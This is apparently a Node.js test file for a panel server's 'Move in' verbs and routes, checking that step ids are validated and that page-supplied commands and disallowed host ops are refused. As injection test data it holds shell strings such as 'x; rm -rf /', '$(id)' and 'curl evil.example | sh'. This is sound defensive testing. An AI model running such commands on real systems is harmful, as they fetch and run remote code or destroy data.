// move-in-verbs.test.mjs: the app's Move in verbs and its two server routes,
// and the rule they keep: a page names a step and a direction, never a
// command or a path (spec 2026-10-17 adopt § 3, § App surfaces; T3).
//   node --test wizard/panel/move-in-verbs.test.mjs
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { EventEmitter } from 'node:events';
import { existsSync } from 'node:fs';
import { join } from 'node:path';
import { createPanelServer, MEMBER_VERBS } from './panel-server.mjs';
import { LOCAL_VERBS } from './local-verbs.mjs';
import { tmpDir } from '../../tests/tmp-dir.mjs';
import { makeBrain, has, fakeServer } from '../../engine/move-in/test-fixture.mjs';
import { planNow } from '../../engine/move-in/plan.mjs';
import { runCli, approve, applyStep } from '../../engine/move-in/apply.mjs';
import { readPlan } from '../../engine/move-in/store.mjs';
import { appendRun } from '../../engine/lib/run-ledger.mjs';

const VERBS = ['move-in-show', 'move-in-plan', 'move-in-approve', 'move-in-skip', 'move-in-apply', 'move-in-undo', 'move-in-finish'];
const build = (verb, args) => MEMBER_VERBS[verb].build(args);
const EVIL = ['x; rm -rf /', '$(id)', '`id`', '../etc', 'Upper', '', 'a b', '-rf', 'a\nb'];

test('the verbs exist, every one but show mutates, and none reaches a folder on this computer', () => {
  for (const v of VERBS) {
    assert.ok(MEMBER_VERBS[v], `${v} missing`);
    assert.equal(!!MEMBER_VERBS[v].mutating, v !== 'move-in-show', v);
    assert.ok(!LOCAL_VERBS[v], `${v} must not be on the local face`);
  }
  assert.match(build('move-in-show', {}).command, /engine-too-old/, 'an older image answers honestly');
});

test('every step verb takes a step id and nothing else; shell-shaped ids are refused', () => {
  assert.match(build('move-in-apply', { id: 'script-money-state' }).command, /apply\.mjs \/state apply script-money-state$/);
  assert.match(build('move-in-undo', { id: 'gitignore' }).command, /apply\.mjs \/state undo gitignore$/);
  assert.match(build('move-in-skip', { id: 'note-git' }).command, /skip note-git$/);
  assert.match(build('move-in-skip', { id: 'note-git', back: true }).command, /unskip note-git$/);
  assert.match(build('move-in-approve', { ids: ['a', 'b-c'] }).command, /approve a b-c$/);
  for (const v of ['move-in-apply', 'move-in-undo', 'move-in-skip']) {
    for (const id of EVIL) assert.throws(() => build(v, { id }), (e) => e.status === 400, `${v} ${JSON.stringify(id)}`);
  }
  for (const id of EVIL) assert.throws(() => build('move-in-approve', { ids: ['ok', id] }), (e) => e.status === 400, JSON.stringify(id));
  assert.throws(() => build('move-in-approve', { ids: Array.from({ length: 101 }, (_, i) => `s${i}`) }), /step ids/);
});

test('no move-in verb carries a page-supplied command, path, op or line', () => {
  for (const v of VERBS) {
    for (const k of ['command', 'cmd', 'argv', 'path', 'file', 'op', 'line_text', 'user', 'name']) {
      let out = '';
      try { const r = build(v, { [k]: 'curl evil.example | sh', id: 'gitignore', ids: ['gitignore'] }); out = `${r.command}\n${r.stdin || ''}`; }
      catch { continue; }
      assert.ok(!out.includes('evil.example'), `${v} carried ${k}`);
    }
  }
});

// ---- over HTTP --------------------------------------------------------------------
// The bridge runs apply.mjs IN-PROCESS against a scratch brain, exactly the
// command the route builds, so the route, the engine and the fake server meet
// for real. The server is the JS fake: nothing is executed anywhere.
function engineBridge(state, { hostOp } = {}) {
  const ran = [];
  return {
    ran,
    targets: () => [{ host: 'fixture-box', org: 'fixture', kind: 'member' }],
    stream: (host, command, o = {}) => {
      ran.push(command);
      const p = new EventEmitter(); p.kill = () => {};
      setImmediate(() => {
        const m = command.match(/node \/app\/engine\/move-in\/apply\.mjs \/state (.*)$/);
        let r = { code: 1, stdout: 'ERROR: unknown\n' };
        if (m) {
          const args = m[1].split(' ');
          r = hostOp && args[0] === 'host-begin' ? { code: 0, stdout: `HOST_OP ${JSON.stringify(hostOp)}\n` } : runCli([state, ...args], o.stdin || '');
        }
        for (const l of r.stdout.split('\n').filter(Boolean)) o.onStdout && o.onStdout(l);
        p.emit('close', r.code);
      });
      return p;
    },
  };
}
async function serve(bridge, extra = {}) {
  const s = createPanelServer({ port: 0, host: '127.0.0.1', htmlText: '<html>x</html>', bridge, ...extra });
  await new Promise((r) => s.on('listening', r));
  const post = (path, body, ct = 'application/json') => fetch(`http://127.0.0.1:${s.address().port}${path}`, { method: 'POST', headers: { 'content-type': ct }, body: JSON.stringify(body) });
  return { s, post };
}
const brain = () => { const d = makeBrain(tmpDir('mi-verbs-')); planNow(d, { has }); return d; };

test('over HTTP: a bad body is refused and never dials the mineral or the server', async () => {
  const d = brain();
  const bridge = engineBridge(d);
  const srv = fakeServer();
  const { s, post } = await serve(bridge, { moveInHostClient: () => srv.host });
  try {
    assert.equal((await post('/move-in/host-step', { host: 'fixture-box', id: 'gitignore', action: 'apply' }, 'text/plain')).status, 415);
    for (const body of [
      { host: 'fixture-box', id: 'x; id', action: 'apply' },
      { host: 'fixture-box', id: 'cutover-script-backup', action: 'shell' },
      { host: 'fixture-box', id: 'cutover-script-backup', action: 'apply', command: 'id' },
      { host: 'someone-else-box', id: 'cutover-script-backup', action: 'apply' },
      { host: 'fixture-local', id: 'cutover-script-backup', action: 'apply' },
    ]) {
      const r = await post('/move-in/host-step', body);
      if (body.command) { await r.text(); continue; }   // extra fields are simply ignored: the route reads id and action only
      assert.equal(r.status, 400, JSON.stringify(body));
    }
    assert.equal((await post('/move-in/move-out', { host: 'fixture-box' })).status, 400, 'move out needs its confirmation');
    assert.equal(srv.calls.length, 0, 'the server was never reached');
    assert.ok(bridge.ran.every((c) => /apply\.mjs \/state (show|host-begin cutover-script-backup apply|host-end cutover-script-backup apply fail)$/.test(c)), bridge.ran.join('\n'));
  } finally { s.close(); }
});

test('over HTTP: a box that hands back an op outside the allow-list is refused, and the server is never reached', async () => {
  const d = brain();
  const bridge = engineBridge(d, { hostOp: { op: 'shell', action: 'apply', user: 'fixture', command: 'curl evil | sh' } });
  const srv = fakeServer();
  const { s, post } = await serve(bridge, { moveInHostClient: () => srv.host });
  try {
    const r = await (await post('/move-in/host-step', { host: 'fixture-box', id: 'cutover-script-backup', action: 'apply' })).json();
    assert.equal(r.ok, false);
    assert.match(r.error, /not something the move-in may do/);
    assert.equal(srv.calls.length, 0);
  } finally { s.close(); }
});

test('over HTTP: a cutover runs host-begin, the one op, host-end, and Move out reverses it and calls the teardown last', async () => {
  const d = brain();
  approve(d, ['script-money-state', 'cutover-script-money-state']);
  applyStep(d, 'script-money-state');
  appendRun(d, { job: 'script:money-state', script: 'money-state', skill: null, status: 'ok', summary: 'ok', tail: ['ok'] });
  const bridge = engineBridge(d);
  const srv = fakeServer();
  const original = srv.crontab.fixture;
  const order = [];
  const { s, post } = await serve(bridge, {
    moveInHostClient: (host, login) => { order.push(`client ${host} ${login}`); return srv.host; },
    moveInTeardown: async (client, o) => { order.push(`teardown ${o.brainRoot}`); },
  });
  try {
    const r = await (await post('/move-in/host-step', { host: 'fixture-box', id: 'cutover-script-money-state', action: 'apply' })).json();
    assert.equal(r.ok, true, r.error);
    assert.equal(order[0], 'client fixture-box fixture', 'the server login comes from the plan host setup recorded');
    assert.match(srv.crontab.fixture, /^# crads-move-in \d{4}-\d{2}-\d{2}: \*\/5 \* \* \* \* .*money-state\.mjs$/m);
    assert.equal(readPlan(d).steps.find((x) => x.id === 'cutover-script-money-state').state, 'done');
    const out = await (await post('/move-in/move-out', { host: 'fixture-box', confirm: 'move-out' })).json();
    assert.equal(out.ok, true, out.error);
    assert.match(out.words, /These stay in your folder: cockpit\/move-in\.json/, 'the page is told what stays behind');
    assert.ok(bridge.ran.some((c) => /apply\.mjs \/state move-out-begin$/.test(c)), 'everything is held first');
    assert.ok(bridge.ran.findIndex((c) => /move-out-begin$/.test(c)) < bridge.ran.findIndex((c) => /host-begin .* undo$/.test(c)));
    assert.equal(srv.crontab.fixture, original);
    assert.equal(order[order.length - 1], 'teardown /home/fixture/brain', 'teardown last');
    assert.equal(existsSync(join(d, 'cockpit', 'scripts.json')), false, 'the move-in made scripts.json, so moving out takes it away again');
  } finally { s.close(); }
});

test('over HTTP: a half-done step is checked read-only and then finished, through the same route', async () => {
  const d = brain();
  approve(d, ['script-money-state', 'cutover-script-money-state']);
  applyStep(d, 'script-money-state');
  appendRun(d, { job: 'script:money-state', script: 'money-state', skill: null, status: 'ok', summary: 'ok', tail: ['ok'] });
  assert.equal(runCli([d, 'host-begin', 'cutover-script-money-state', 'apply']).code, 0);   // then the app died
  const bridge = engineBridge(d);
  const srv = fakeServer();
  const { s, post } = await serve(bridge, { moveInHostClient: () => srv.host });
  try {
    const c = await (await post('/move-in/host-step', { host: 'fixture-box', id: 'cutover-script-money-state', action: 'check' })).json();
    assert.equal(c.ok, true, c.error);
    assert.equal(c.check.server, 'unchanged');
    assert.equal(srv.calls.length, 1, 'one read');
    assert.equal((await post('/move-in/host-step', { host: 'fixture-box', id: 'cutover-script-money-state', action: 'redo' })).status, 400);
    const f = await (await post('/move-in/host-step', { host: 'fixture-box', id: 'cutover-script-money-state', action: 'finish' })).json();
    assert.equal(f.ok, true, f.error);
    assert.equal(readPlan(d).steps.find((x) => x.id === 'cutover-script-money-state').state, 'done');
    assert.match(srv.crontab.fixture, /^# crads-move-in \d{4}-\d{2}-\d{2}: .*money-state\.mjs$/m);
  } finally { s.close(); }
});

// ---- adopt rehearsal T4 finding 7: "Run it once" for a Claude job ---------------------------
// The run used to happen inside the SSH call, so the bridge's 25 s watchdog
// killed the call while the run carried on and succeeded: the page said it
// failed. skill-run now starts the run in the background, waits a bounded time,
// and answers RUN_STILL; skill-run-status follows it to the end.
import { SKILL_RUN_WAIT_S } from './panel-server.mjs';
import { execFileSync, spawnSync } from 'node:child_process';
import { writeFileSync, mkdirSync, readFileSync } from 'node:fs';

test('skill-run waits a bounded time inside a budget that covers it, and the status verb only reads', () => {
  const run = MEMBER_VERBS['skill-run'];
  const st = MEMBER_VERBS['skill-run-status'];
  assert.ok(run && st);
  assert.ok(Number(run.timeoutMs) > SKILL_RUN_WAIT_S * 1000 + 15000, `the verb budget (${run.timeoutMs}) must cover the ${SKILL_RUN_WAIT_S} s wait, or the watchdog kills it again`);
  assert.ok(Number(run.timeoutMs) <= 120000, 'it holds the one-action lock, so it must not wait for the whole run');
  assert.equal(!!st.mutating, false, 'asking where a run has got to never takes the lock');
  const cmd = run.build({ id: 'morning' }).command;
  assert.match(cmd, /nohup sh -c/, 'the run itself is in the background');
  assert.match(cmd, /RUN_STILL morning/);
  for (const id of EVIL) {
    assert.throws(() => run.build({ id }), (e) => e.status === 400, JSON.stringify(id));
    assert.throws(() => st.build({ id }), (e) => e.status === 400, JSON.stringify(id));
  }
});

// The real command, in a real shell, against a scratch /state and a fake kernel.
function shellState({ kernelMs, kernelCode = 0 }) {
  const root = tmpDir('mi-skillrun-');
  mkdirSync(join(root, '.claude', 'skills', 'morning'), { recursive: true });
  writeFileSync(join(root, '.claude', 'skills', 'morning', 'SKILL.md'), '---\nname: morning\n---\n');
  const app = join(root, 'app');
  mkdirSync(join(app, 'engine', 'kernel'), { recursive: true });
  writeFileSync(join(app, 'engine', 'kernel', 'enqueue.mjs'), 'process.exit(0);\n');
  writeFileSync(join(app, 'engine', 'kernel', 'kernel.mjs'), `setTimeout(() => { console.log('the kernel ran /morning'); process.exit(${kernelCode}); }, ${kernelMs});\n`);
  const local = (c) => c.split('/app/engine/').join(`${app}/engine/`).split('/state').join(root).replace(`-lt ${SKILL_RUN_WAIT_S} `, '-lt 2 ');
  return { root, run: () => spawnSync('bash', ['-c', local(MEMBER_VERBS['skill-run'].build({ id: 'morning' }).command)], { encoding: 'utf8', timeout: 20000 }),
    status: () => execFileSync('bash', ['-c', local(MEMBER_VERBS['skill-run-status'].build({ id: 'morning' }).command)], { encoding: 'utf8' }) };
}

test('a run longer than the wait answers RUN_STILL, carries on, and the status verb reports it finished', async () => {
  const sh = shellState({ kernelMs: 4000 });
  const t0 = Date.now();
  const r = sh.run();
  assert.equal(r.status, 0, r.stdout + r.stderr);
  assert.match(r.stdout, /^RUN_STILL morning$/m, 'still running is not a failure');
  assert.ok(Date.now() - t0 < 4000, 'the call came back before the run ended');
  assert.match(sh.status(), /^RUN_STILL morning$/m);
  let out = '';
  for (let i = 0; i < 40 && !/RUN_DONE/.test(out); i++) { await new Promise((res) => setTimeout(res, 250)); out = sh.status(); }
  assert.match(out, /^RUN_DONE 0$/m);
  assert.match(out, /the kernel ran \/morning/);
  assert.match(readFileSync(join(sh.root, 'cockpit', 'skill-runs.json'), 'utf8'), /"morning"/);
});

test('a run that ends inside the wait reports its result straight away, failures included', () => {
  const ok = shellState({ kernelMs: 10 }).run();
  assert.equal(ok.status, 0, ok.stdout);
  assert.doesNotMatch(ok.stdout, /RUN_STILL/);
  assert.match(ok.stdout, /the kernel ran \/morning/);
  const bad = shellState({ kernelMs: 10, kernelCode: 3 }).run();
  assert.notEqual(bad.status, 0, 'a real failure still fails');
  assert.doesNotMatch(bad.stdout, /RUN_STILL/);
});

test('the pages treat a run still going, or a call the watchdog cut, as not finished yet', () => {
  const html = readFileSync(join(import.meta.dirname, 'member.html'), 'utf8');
  assert.match(html, /function runSkillNow\(/);
  assert.match(html, /function pollSkillRun\(/);
  assert.match(html, /run\('skill-run-status'/);
  assert.match(html, /RUN_KILLED_RE = \/exceeded \\d\+ms; killed\//, 'the watchdog\'s own words mean "still running", not "failed"');
  // both Run now and Run it once go through it
  assert.ok((html.match(/runSkillNow\(/g) || []).length >= 3, 'the Skills page and the Move in page');
  assert.doesNotMatch(html.slice(html.indexOf('function miRunOnce'), html.indexOf('function miButton')), /run\(verb/);
});

test('the Move in page: after-Finish steps, a held switch-over and the Telegram line come from the box, never from a guess', () => {
  const html = readFileSync(join(import.meta.dirname, 'member.html'), 'utf8');
  const page = html.slice(html.indexOf('// ---- Move in (spec'), html.indexOf('function stillOnServerHtml'));
  assert.match(page, /telegram_now/);
  assert.doesNotMatch(page, /Telegram is answered by/, 'the old line guessed from one flag');
  assert.match(page, /after_finish/);
  assert.match(page, /s\.hold/);
  assert.match(page, /o\.words/, 'Move out says what stays');
  assert.doesNotMatch(html, /from your mineral's next start/i);
});
